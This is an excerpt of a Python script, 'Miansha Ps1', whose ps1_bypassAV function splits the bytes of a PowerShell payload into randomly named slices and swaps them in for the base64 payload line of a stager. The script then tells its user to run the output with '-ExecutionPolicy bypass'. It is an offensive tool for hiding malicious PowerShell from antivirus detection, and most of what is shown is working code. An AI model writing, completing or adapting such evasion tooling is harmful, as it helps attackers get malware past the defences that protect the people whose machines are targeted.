...
def list_random_slice(data_list):
    slice_num = random.randint(5, 15)
    result_list = []
    length = len(data_list)
    step = length // slice_num
    # 排除最后会余几个的情况，毕竟上面是四舍运算
    if step*slice_num >=length:
        pass
    else:
        slice_num += 1
    ...
    # print(result_list)
    return result_list, slice_num


def ps1_bypassAV(payload_file):
    try:
        # print(1)
    ...
    for i in byte_data:
        ...
        byte_list.append(i)
    payload_byte_list, slice_num = list_random_slice(byte_list)
    # print(slice_num)
    # print("result", result)
    # print(byte_list)
    payload_slice_names = []
    ...
    for i in range(slice_num):
        payload_slice_names.append(get_random_string())
    # 生成多个payload的分片ps1 代码
    for sublist in payload_byte_list:
        # [Byte[]]$var_c1 =  [Byte[]](31,42,160,68,249)
        # print(sublist)
        payload += "[Byte[]]$" + payload_slice_names[payload_byte_list.index(sublist)] +" = [Byte[]](" + ",".join(str(byte) for byte in sublist) + ")\n\t"
    # exit(0)
    # payload_name = get_random_string()
    payload = payload + "\n\t[Byte[]]$var_code = " + " + ".join("$"+x for x in payload_slice_names)
    ...
    data = re.sub(r"\[Byte\[]]\$var_code = \[System.Convert]::FromBase64String\('(.*?)'\)", payload, data, 1)
    ...
    print("[*]              Usage: powershell -ExecutionPolicy bypass -File .\\" + resultps1_name + ".ps1  generated!                    [*]")
    time.sleep(1)
    resultps1.close()
...
if __name__ == "__main__":
    banner = """
        Miansha Ps1  Write By Komomon
    """
    print(banner)
    parser = argparse.ArgumentParser(usage="", description="des")
    parser.add_argument("-f", "--file", type=str, dest="file", required=True, help="The powershell file")
